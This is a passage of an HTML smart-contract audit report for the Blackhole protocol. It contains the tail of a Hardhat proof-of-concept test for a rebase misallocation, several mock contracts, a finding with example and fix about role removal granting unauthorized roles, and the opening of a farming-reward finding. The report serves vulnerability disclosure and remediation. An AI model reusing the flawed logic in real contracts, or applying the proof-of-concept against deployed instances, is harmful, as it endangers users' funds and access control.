<span class="grvsc-line"><span class="grvsc-source">        console.log("Expected Misallocated Rebase (Corrected - Contract):", formatBN(expected_misallocated_rebase));</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">        // --- Assertions for Vulnerable Outcome ---</span></span>
<span class="grvsc-line"><span class="grvsc-source">        expect(smNFTBalance_before).to.be.gt(0, "Test setup failed: smNFTBalance should be positive for this test case");</span></span>
<span class="grvsc-line"><span class="grvsc-source">        expect(rebaseAmount_from_contract_calc).to.be.lt(corrected_rebaseAmount, "Contract's rebase should be less than corrected rebase when smNFTs exist");</span></span>
<span class="grvsc-line"><span class="grvsc-source">        expect(expected_misallocated_rebase).to.be.gt(0, "Expected misallocated rebase amount should be greater than zero");</span></span>
<span class="grvsc-line"><span class="grvsc-source">        </span></span>
<span class="grvsc-line"><span class="grvsc-source">        // --- Demonstrate Upstream Impact on State ---</span></span>
<span class="grvsc-line"><span class="grvsc-source">        const rewardsDistributor_bal_before_mint = await blackToken.balanceOf(rewardsDistributorMock.address);</span></span>
<span class="grvsc-line"><span class="grvsc-source">        const minterTeamAddress = await minter.team();</span></span>
<span class="grvsc-line"><span class="grvsc-source">        const team_bal_before_mint = await blackToken.balanceOf(minterTeamAddress);</span></span>
<span class="grvsc-line"><span class="grvsc-source">        const gaugeManager_allowance_before_mint = await blackToken.allowance(minter.address, gaugeManagerMock.address);</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">// Calculate expected team and gauge amounts based on BOTH contract's flawed rebase AND corrected rebase</span></span>
<span class="grvsc-line"><span class="grvsc-source">        const teamRate = await minter.teamRate();</span></span>
<span class="grvsc-line"><span class="grvsc-source">        const MAX_BPS = await minter.MAX_BPS();</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">        const teamEmission_contract = weeklyEmission_for_period.mul(teamRate).div(MAX_BPS);</span></span>
<span class="grvsc-line"><span class="grvsc-source">        const gaugeEmission_contract = weeklyEmission_for_period.sub(rebaseAmount_from_contract_calc).sub(teamEmission_contract);</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">        const teamEmission_corrected = weeklyEmission_for_period.mul(teamRate).div(MAX_BPS); // team emission is same</span></span>
<span class="grvsc-line"><span class="grvsc-source">        const gaugeEmission_corrected = weeklyEmission_for_period.sub(corrected_rebaseAmount).sub(teamEmission_corrected);</span></span>
<span class="grvsc-line"><span class="grvsc-source">        </span></span>
<span class="grvsc-line"><span class="grvsc-source">        console.log("\n--- Predicted Distribution (based on contract's flawed rebase) ---");</span></span>
<span class="grvsc-line"><span class="grvsc-source">        console.log("  Predicted Rebase to Distributor:", formatBN(rebaseAmount_from_contract_calc));</span></span>
<span class="grvsc-line"><span class="grvsc-source">        console.log("  Predicted Emission to Team:", formatBN(teamEmission_contract));</span></span>
<span class="grvsc-line"><span class="grvsc-source">        console.log("  Predicted Emission to Gauges:", formatBN(gaugeEmission_contract));</span></span>
<span class="grvsc-line"><span class="grvsc-source">        </span></span>
<span class="grvsc-line"><span class="grvsc-source">        console.log("\n--- Predicted Distribution (based on CORRECTED rebase) ---");</span></span>
<span class="grvsc-line"><span class="grvsc-source">        console.log("  Predicted Rebase to Distributor (Corrected):", formatBN(corrected_rebaseAmount));</span></span>
<span class="grvsc-line"><span class="grvsc-source">        console.log("  Predicted Emission to Team (Corrected):", formatBN(teamEmission_corrected));</span></span>
<span class="grvsc-line"><span class="grvsc-source">        console.log("  Predicted Emission to Gauges (Corrected):", formatBN(gaugeEmission_corrected));</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">        // Execute the minting period update</span></span>
<span class="grvsc-line"><span class="grvsc-source">        await minter.connect(deployer).update_period(); </span></span>
<span class="grvsc-line"><span class="grvsc-source">        </span></span>
<span class="grvsc-line"><span class="grvsc-source">        const rewardsDistributor_bal_after_mint = await blackToken.balanceOf(rewardsDistributorMock.address);</span></span>
<span class="grvsc-line"><span class="grvsc-source">        const team_bal_after_mint = await blackToken.balanceOf(minterTeamAddress);</span></span>
<span class="grvsc-line"><span class="grvsc-source">        const gaugeManager_allowance_after_mint = await blackToken.allowance(minter.address, gaugeManagerMock.address);</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">        const rebase_actually_paid = rewardsDistributor_bal_after_mint.sub(rewardsDistributor_bal_before_mint);</span></span>
<span class="grvsc-line"><span class="grvsc-source">        const team_actually_paid = team_bal_after_mint.sub(team_bal_before_mint);</span></span>
<span class="grvsc-line"><span class="grvsc-source">        const gauge_actually_approved = gaugeManager_allowance_after_mint.sub(gaugeManager_allowance_before_mint); // Assuming allowance starts at 0 or reset</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">        console.log("\n--- Actual Distribution After Minter.update_period() ---");</span></span>
<span class="grvsc-line"><span class="grvsc-source">        console.log("  Actual Rebase Paid to RewardsDistributor:", formatBN(rebase_actually_paid));</span></span>
<span class="grvsc-line"><span class="grvsc-source">        console.log("  Actual Emission Paid to Team:", formatBN(team_actually_paid));</span></span>
<span class="grvsc-line"><span class="grvsc-source">        console.log("  Actual Emission Approved for GaugeManager:", formatBN(gauge_actually_approved));</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">        // Assert that actual payments match the contract's flawed calculations</span></span>
<span class="grvsc-line"><span class="grvsc-source">        expect(rebase_actually_paid).to.equal(rebaseAmount_from_contract_calc, "Actual rebase paid should match contract's flawed calculation");</span></span>
<span class="grvsc-line"><span class="grvsc-source">        expect(team_actually_paid).to.equal(teamEmission_contract, "Actual team emission should match contract's calculation");</span></span>
<span class="grvsc-line"><span class="grvsc-source">        expect(gauge_actually_approved).to.equal(gaugeEmission_contract, "Actual gauge approval should match contract's calculation");</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">        // Assert that gauge emission is higher than it should be</span></span>
<span class="grvsc-line"><span class="grvsc-source">        expect(gauge_actually_approved).to.be.gt(gaugeEmission_corrected, "Gauge emission is higher than it should be due to understated rebase");</span></span>
<span class="grvsc-line"><span class="grvsc-source">        const excessToGauges = gauge_actually_approved.sub(gaugeEmission_corrected);</span></span>
<span class="grvsc-line"><span class="grvsc-source">        expect(excessToGauges).to.equal(expected_misallocated_rebase, "Excess to gauges should equal the rebase misallocation");</span></span>
<span class="grvsc-line"><span class="grvsc-source">    });</span></span>
<span class="grvsc-line"><span class="grvsc-source">});</span></span></code></pre>
</details>
<p><strong><code>contracts/mocks/GaugeManagerMock.sol</code>:</strong></p>
<pre data-index="14" data-language="" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source">// SPDX-License-Identifier: UNLICENSED</span></span>
<span class="grvsc-line"><span class="grvsc-source">pragma solidity ^0.8.13;</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">// Corrected path: go up one level from 'mocks' to 'contracts', then into 'interfaces'</span></span>
<span class="grvsc-line"><span class="grvsc-source">import { IBlackGovernor } from "../interfaces/IBlackGovernor.sol";</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">contract GaugeManagerMock {</span></span>
<span class="grvsc-line"><span class="grvsc-source">    address public blackGovernor;</span></span>
<span class="grvsc-line"><span class="grvsc-source">    uint256 public lastRewardAmount; // Added to observe notified amount</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    function notifyRewardAmount(uint256 amount) external {</span></span>
<span class="grvsc-line"><span class="grvsc-source">        lastRewardAmount = amount;</span></span>
<span class="grvsc-line"><span class="grvsc-source">    }</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    function getBlackGovernor() external view returns (address) {</span></span>
<span class="grvsc-line"><span class="grvsc-source">        return blackGovernor;</span></span>
<span class="grvsc-line"><span class="grvsc-source">    }</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    function setBlackGovernor(address _gov) external { // Added for setup convenience</span></span>
<span class="grvsc-line"><span class="grvsc-source">        blackGovernor = _gov;</span></span>
<span class="grvsc-line"><span class="grvsc-source">    }</span></span>
<span class="grvsc-line"><span class="grvsc-source">}</span></span></code></pre>
<p><strong><code>contracts/mocks/RewardsDistributorMock.sol</code>:</strong></p>
<pre data-index="15" data-language="" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source">// SPDX-License-Identifier: UNLICENSED</span></span>
<span class="grvsc-line"><span class="grvsc-source">pragma solidity ^0.8.13;</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">contract RewardsDistributorMock {</span></span>
<span class="grvsc-line"><span class="grvsc-source">    // event TokenCheckpointed(); // Optional: if you want to verify it's called</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    function checkpoint_token() external {</span></span>
<span class="grvsc-line"><span class="grvsc-source">        // emit TokenCheckpointed(); // Optional</span></span>
<span class="grvsc-line"><span class="grvsc-source">    }</span></span>
<span class="grvsc-line"><span class="grvsc-source">}</span></span></code></pre>
<p><strong><code>contracts/mocks/BlackGovernorMock.sol</code>:</strong></p>
<pre data-index="16" data-language="" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source">// SPDX-License-Identifier: UNLICENSED</span></span>
<span class="grvsc-line"><span class="grvsc-source">pragma solidity ^0.8.13;</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">// Assuming IBlackGovernor.sol is in contracts/interfaces/</span></span>
<span class="grvsc-line"><span class="grvsc-source">// Corrected path: go up one level from 'mocks' to 'contracts', then into 'interfaces'</span></span>
<span class="grvsc-line"><span class="grvsc-source">import { IBlackGovernor } from "../interfaces/IBlackGovernor.sol"; </span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">contract BlackGovernorMock {</span></span>
<span class="grvsc-line"><span class="grvsc-source">    IBlackGovernor.ProposalState public mockProposalState = IBlackGovernor.ProposalState.Pending;</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    function status() external view returns (IBlackGovernor.ProposalState) {</span></span>
<span class="grvsc-line"><span class="grvsc-source">        return mockProposalState;</span></span>
<span class="grvsc-line"><span class="grvsc-source">    }</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    // Helper to change state for testing if needed</span></span>
<span class="grvsc-line"><span class="grvsc-source">    function setMockProposalState(IBlackGovernor.ProposalState _newState) external {</span></span>
<span class="grvsc-line"><span class="grvsc-source">        mockProposalState = _newState;</span></span>
<span class="grvsc-line"><span class="grvsc-source">    }</span></span>
<span class="grvsc-line"><span class="grvsc-source">}</span></span></code></pre>
<p><strong><a href="https://github.com/code-423n4/2025-06-blackhole-mitigation?tab=readme-ov-file#mitigation-of-high--medium-severity-issues">Blackhole mitigated</a></strong></p>
<p><strong>Status:</strong> Mitigation confirmed. Full details in reports from <a href="https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-2">lonelybones</a>, <a href="https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-50">rayss</a> and <a href="https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-67">maxvzuvex</a>.</p>
<hr>
<h2 style="position:relative;" id="m-02-critical-access-control-flaw-role-removal-logic-incorrectly-grants-unauthorized-roles"><a class="anchor before" aria-label="m 02 critical access control flaw role removal logic incorrectly grants unauthorized roles permalink" href="#m-02-critical-access-control-flaw-role-removal-logic-incorrectly-grants-unauthorized-roles"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a><a href="https://code4rena.com/audits/2025-05-blackhole/submissions/F-218">[M-02] Critical access control flaw: Role removal logic incorrectly grants unauthorized roles</a></h2>
<p><em>Submitted by <a href="https://code4rena.com/audits/2025-05-blackhole/submissions/S-184">rayss</a>, also found by <a href="https://code4rena.com/audits/2025-05-blackhole/submissions/S-311">KineticsOfWeb3</a></em></p>
<p><a href="https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/PermissionsRegistry.sol#L113">https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/PermissionsRegistry.sol#L113</a></p>
<h3 style="position:relative;" id="finding-description-1"><a class="anchor before" aria-label="finding description 1 permalink" href="#finding-description-1"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Finding description</h3>
<p>The <code>removeRole()</code> function incorrectly updates a user’s role list by replacing a removed role with the last role from the <code>global_roles</code> array. This results in unintended and unauthorized role assignments to users.</p>
<p>The <code>removeRole()</code> function correctly removes a role from the system by deleting it from the global roles list. However, when updating the users’ assigned roles arrays, the current logic mistakenly replaces the removed role with the last role from the global roles list rather than just deleting the role from the array. </p>
<p>When removing a role from a user’s assigned roles array (<code>_addressToRoles[user]</code>), the function tries to keep the array compact by replacing the role to be removed with the last element of the <code>global_roles</code> array. This is incorrect because it mistakenly assigns a completely unrelated role from the global roles list to the user, corrupting their role assignments.</p>
<p>This causes unrelated global roles to be incorrectly assigned to the user whose role is being removed.</p>
<h3 style="position:relative;" id="proof-of-concept-example"><a class="anchor before" aria-label="proof of concept example permalink" href="#proof-of-concept-example"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Proof of Concept (Example)</h3>
<p>Assume the <code>global_roles</code> array contains:</p>
<pre data-index="17" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">[</span><span class="mtk8">"GOVERNANCE"</span><span class="mtk1">, </span><span class="mtk8">"VOTER_ADMIN"</span><span class="mtk1">, </span><span class="mtk8">"GAUGE_ADMIN"</span><span class="mtk1">, </span><span class="mtk8">"BRIBE_ADMIN"</span><span class="mtk1">]</span></span></span></code></pre>
<p>Alice has two roles:</p>
<pre data-index="18" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">_addressToRoles</span><span class="mtk1">[</span><span class="mtk12">Alice</span><span class="mtk1">] = [</span><span class="mtk8">"VOTER_ADMIN"</span><span class="mtk1">, </span><span class="mtk8">"GAUGE_ADMIN"</span><span class="mtk1">]</span></span></span></code></pre>
<p>Calling <code>removeRole("GAUGE_ADMIN")</code> results in:</p>
<pre data-index="19" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">_addressToRoles</span><span class="mtk1">[</span><span class="mtk12">Alice</span><span class="mtk1">][</span><span class="mtk7">1</span><span class="mtk1">] = </span><span class="mtk12">_roles</span><span class="mtk1">[</span><span class="mtk12">_roles</span><span class="mtk1">.</span><span class="mtk12">length</span><span class="mtk1"> - </span><span class="mtk7">1</span><span class="mtk1">]; </span><span class="mtk3">// "BRIBE_ADMIN"</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">_addressToRoles</span><span class="mtk1">[</span><span class="mtk12">Alice</span><span class="mtk1">].</span><span class="mtk11">pop</span><span class="mtk1">();</span><span class="mtk3">// removes last element</span></span></span></code></pre>
<p>Alice’s roles become:</p>
<pre data-index="20" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">[</span><span class="mtk8">"VOTER_ADMIN"</span><span class="mtk1">, </span><span class="mtk8">"BRIBE_ADMIN"</span><span class="mtk1">]</span></span></span></code></pre>
<p>Now Alice has Alice unintentionally gains the <code>BRIBE_ADMIN</code> role without authorization.</p>
<h3 style="position:relative;" id="impact-2"><a class="anchor before" aria-label="impact 2 permalink" href="#impact-2"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Impact</h3>
<ul>
<li>This bug leads to privilege escalation — a user can be granted a role they were never assigned, simply due to role removal logic. If roles like <code>BRIBE_ADMIN</code> or <code>GAUGE_ADMIN</code> are mistakenly granted.</li>
<li>Broken access control due to corrupted role removal logic.</li>
</ul>
<h3 style="position:relative;" id="severity-justification"><a class="anchor before" aria-label="severity justification permalink" href="#severity-justification"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Severity Justification</h3>
<p>This issue is classified as high severity because it directly compromises the integrity of the protocol’s access control system. By unintentionally assigning incorrect roles during the removal process, users may be granted powerful administrative permissions such as <code>GAUGE_ADMIN</code> or <code>BRIBE_ADMIN</code> (or any other role) without proper authorization. These roles often govern critical operations, which can influence protocol behavior.</p>
<h3 style="position:relative;" id="recommended-mitigation-steps-3"><a class="anchor before" aria-label="recommended mitigation steps 3 permalink" href="#recommended-mitigation-steps-3"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Recommended mitigation steps</h3>
<pre data-index="21" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk15">for</span><span class="mtk1"> (</span><span class="mtk12">uint</span><span class="mtk1"> </span><span class="mtk12">i</span><span class="mtk1"> = </span><span class="mtk7">0</span><span class="mtk1">; </span><span class="mtk12">i</span><span class="mtk1"> &lt; </span><span class="mtk12">atr</span><span class="mtk1">.</span><span class="mtk12">length</span><span class="mtk1">; </span><span class="mtk12">i</span><span class="mtk1">++) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk15">if</span><span class="mtk1"> (</span><span class="mtk11">keccak256</span><span class="mtk1">(</span><span class="mtk12">atr</span><span class="mtk1">[</span><span class="mtk12">i</span><span class="mtk1">]) == </span><span class="mtk11">keccak256</span><span class="mtk1">(</span><span class="mtk12">_role</span><span class="mtk1">)) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">atr</span><span class="mtk1">[</span><span class="mtk12">i</span><span class="mtk1">] = </span><span class="mtk12">atr</span><span class="mtk1">[</span><span class="mtk12">atr</span><span class="mtk1">.</span><span class="mtk12">length</span><span class="mtk1"> - </span><span class="mtk7">1</span><span class="mtk1">]; </span><span class="mtk3">// Replace with last element</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">atr</span><span class="mtk1">.</span><span class="mtk11">pop</span><span class="mtk1">();                    </span><span class="mtk3">// Remove last element</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk15">break</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    }</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">}</span></span></span></code></pre>
<p>The mitigation correctly updates the user’s assigned roles array (<code>_addressToRoles[user]</code>) without referencing the <code>global_roles</code> array. When removing a role, it swaps the role to be removed with the last element in the user’s own roles array and then removes (pops) the last element. This preserves the compactness and order of the array while ensuring only roles actually assigned to the user remain.</p>
<p>Crucially, it avoids mistakenly assigning unrelated roles from the <code>global_roles</code> list, preventing corruption of the user’s role data and maintaining accurate access control.</p>
<p><strong><a href="https://github.com/code-423n4/2025-06-blackhole-mitigation?tab=readme-ov-file#mitigation-of-high--medium-severity-issues">Blackhole mitigated</a></strong></p>
<p><strong>Status:</strong> Mitigation confirmed. Full details in reports from <a href="https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-30">rayss</a> and <a href="https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-21">maxvzuvex</a>.</p>
<p>The sponsor team requested that the following note be included: </p>
<blockquote>
<p>This issue originates from the upstream codebase, inherited from ThenaV2 fork. Given that ThenaV2 has successfully operated at scale for several months without incident, we assess the severity of this issue as low. The implementation has been effectively battle-tested in a production environment, which significantly reduces the practical risk associated with this finding.
Reference: <a href="https://github.com/ThenafiBNB/THENA-Contracts/blob/main/contracts/PermissionsRegistry.sol#L108">https://github.com/ThenafiBNB/THENA-Contracts/blob/main/contracts/PermissionsRegistry.sol#L108</a></p>
</blockquote>
<hr>
<h2 style="position:relative;" id="m-03-1e10-fixed-farming-reward-in-gaugefactorycl"><a class="anchor before" aria-label="m 03 1e10 fixed farming reward in gaugefactorycl permalink" href="#m-03-1e10-fixed-farming-reward-in-gaugefactorycl"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a><a href="https://code4rena.com/audits/2025-05-blackhole/submissions/F-127">[M-03] <code>1e10</code> fixed farming reward in <code>GaugeFactoryCL</code></a></h2>
<p><em>Submitted by <a href="https://code4rena.com/audits/2025-05-blackhole/submissions/S-175">danzero</a></em></p>
<p><a href="https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/AlgebraCLVe33/GaugeFactoryCL.sol#L75">https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/AlgebraCLVe33/GaugeFactoryCL.sol#L75</a></p>
<h3 style="position:relative;" id="finding-descriptions-and-impact"><a class="anchor before" aria-label="finding descriptions and impact permalink" href="#finding-descriptions-and-impact"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Finding descriptions and impact</h3>
<p>Below is the implementation of the <code>createEternalFarming</code> function in <code>GaugeFactoryCL.sol</code>:</p>
<pre data-index="22" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">createEternalFarming</span><span class="mtk1">(</span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">_pool</span><span class="mtk1">, </span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">_algebraEternalFarming</span><span class="mtk1">, </span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">_rewardToken</span><span class="mtk1">, </span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">_bonusRewardToken</span><span class="mtk1">) </span><span class="mtk11">internal</span><span class="mtk1"> {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">IAlgebraPool</span><span class="mtk1"> </span><span class="mtk12">algebraPool</span><span class="mtk1"> = </span><span class="mtk11">IAlgebraPool</span><span class="mtk1">(</span><span class="mtk12">_pool</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">uint24</span><span class="mtk1"> </span><span class="mtk12">tickSpacing</span><span class="mtk1"> = </span><span class="mtk11">uint24</span><span class="mtk1">(</span><span class="mtk12">algebraPool</span><span class="mtk1">.</span><span class="mtk11">tickSpacing</span><span class="mtk1">());</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">pluginAddress</span><span class="mtk1"> = </span><span class="mtk12">algebraPool</span><span class="mtk1">.</span><span class="mtk11">plugin</span><span class="mtk1">();        </span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">IncentiveKey</span><span class="mtk1"> </span><span class="mtk12">memory</span><span class="mtk1"> </span><span class="mtk12">incentivekey</span><span class="mtk1"> = </span><span class="mtk11">getIncentiveKey</span><span class="mtk1">(</span><span class="mtk12">_rewardToken</span><span class="mtk1">, </span><span class="mtk12">_bonusRewardToken</span><span class="mtk1">, </span><span class="mtk12">_pool</span><span class="mtk1">, </span><span class="mtk12">_algebraEternalFarming</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">remainingTimeInCurrentEpoch</span><span class="mtk1"> = </span><span class="mtk12">BlackTimeLibrary</span><span class="mtk1">.</span><span class="mtk11">epochNext</span><span class="mtk1">(</span><span class="mtk12">block</span><span class="mtk1">.</span><span class="mtk12">timestamp</span><span class="mtk1">) - </span><span class="mtk12">block</span><span class="mtk1">.</span><span class="mtk12">timestamp</span><span class="mtk1">;</span></span></span>
